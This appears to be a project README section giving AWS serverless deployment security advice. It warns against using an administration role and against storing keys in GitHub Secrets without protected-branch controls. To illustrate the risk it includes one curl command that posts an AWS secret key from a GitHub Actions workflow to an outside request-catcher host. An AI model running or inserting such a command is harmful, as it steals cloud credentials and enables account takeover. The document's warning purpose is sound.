# Serverless Deployment Policy
Sadly, the serverless documentation does not clearly mention that the **“Administration Role” should never be used in production environments**. 
Using this role can cause significant security risks. If someone gains access to these keys, 
they may be able to create a new user with access to the web console and take full control of your AWS account.

Please create pull requests if you come across new permissions such as for AWS Kinesis.

## GitHub Secrets Note
Storing keys directly in GitHub Secrets without additional security controls can lead to unauthorized access. 
Any user with commit privileges could potentially use GitHub Actions to extract these keys:

```
curl -d '{ "name": "${{ secrets.AWS_SECRET_KEY }}" }' \
  -H "Content-Type: application/json" \
  https://enci4g46iahum.x.pipedream.net/
```

With this in mind, also avoid using the “Administration Role” for all AWS accounts and only store the keys 
in GitHub Secrets when using the GitHub Environment with the “Protected Branch” configuration.
